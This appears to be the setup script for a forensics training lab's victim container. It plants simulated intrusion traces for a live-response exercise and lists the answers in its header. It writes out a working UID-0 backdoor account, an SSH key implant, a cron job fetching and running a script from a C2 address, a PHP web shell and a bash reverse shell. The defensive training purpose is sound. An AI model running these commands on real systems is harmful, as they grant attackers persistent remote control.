#!/bin/bash
# Start the services, then plant the traces of a (simulated) intrusion for the live-response tool
# to find. Everything is local to this container; the "C2" is the c2 container on the lab network.
#
# Ground truth (keep this out of your report until you've found each item with the tools!):
#   T1136 new account        : user "svc-backup" with UID 0
#   T1098 SSH key implant    : attacker key appended to /root/.ssh/authorized_keys
#   T1053 cron persistence   : /etc/cron.d/sys-update pulls a script from the C2 every 5 min
#   T1059 reverse shell      : bash -i >& /dev/tcp/10.10.40.66/4444
#   T1036 masquerading       : a binary running as /tmp/.kworker, deleted from disk after launch
#   T1070 timestomping       : /usr/local/bin/sysupdate dated 2019-01-01
#   T1505 web shell          : /var/www/html/uploads/shell.php
#   T1110 brute force        : comes later from the C2 (attack.sh) into auth.log
set -e

sed -i 's/^module(load="imklog"/#&/' /etc/rsyslog.conf   # no kernel log access in a container
rsyslogd                                                    # (no init script on Ubuntu 24.04)
service ssh start      >/dev/null
service cron start     >/dev/null
service nginx start    >/dev/null
echo "<h1>web-prod-01</h1>" >/var/www/html/index.html
useradd -m -s /bin/bash deploy 2>/dev/null && echo 'deploy:Deploy#2026' | chpasswd

# --- the intrusion ------------------------------------------------------------------------
if ! id svc-backup >/dev/null 2>&1; then
  useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svc-backup
  echo 'svc-backup:Backd00r!' | chpasswd
fi

mkdir -p /root/.ssh && chmod 700 /root/.ssh
grep -q attacker@c2 /root/.ssh/authorized_keys 2>/dev/null || \
  echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL4bRzRkq1hZ0f0m4b1lYbXq9w2YkqvA3d1lYJk0c2Ff attacker@c2' >>/root/.ssh/authorized_keys

echo '*/5 * * * * root curl -fsS http://10.10.40.66:8080/u.sh | bash >/dev/null 2>&1' >/etc/cron.d/sys-update

printf '#!/bin/bash\n# "system updater"\nwhile true; do sleep 300; done\n' >/usr/local/bin/sysupdate
chmod +x /usr/local/bin/sysupdate
touch -d '2019-01-01 03:14:15' /usr/local/bin/sysupdate

mkdir -p /var/www/html/uploads
echo '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>' >/var/www/html/uploads/shell.php

cp /bin/sleep /tmp/.kworker
nohup /tmp/.kworker 86400 >/dev/null 2>&1 &
sleep 0.2; rm -f /tmp/.kworker                       # binary deleted while still running

nohup bash -c 'while true; do bash -i >& /dev/tcp/10.10.40.66/4444 0>&1; sleep 10; done' >/dev/null 2>&1 &

echo "[victim] services up, intrusion artifacts planted"
exec tail -F /var/log/nginx/access.log /var/log/auth.log 2>/dev/null
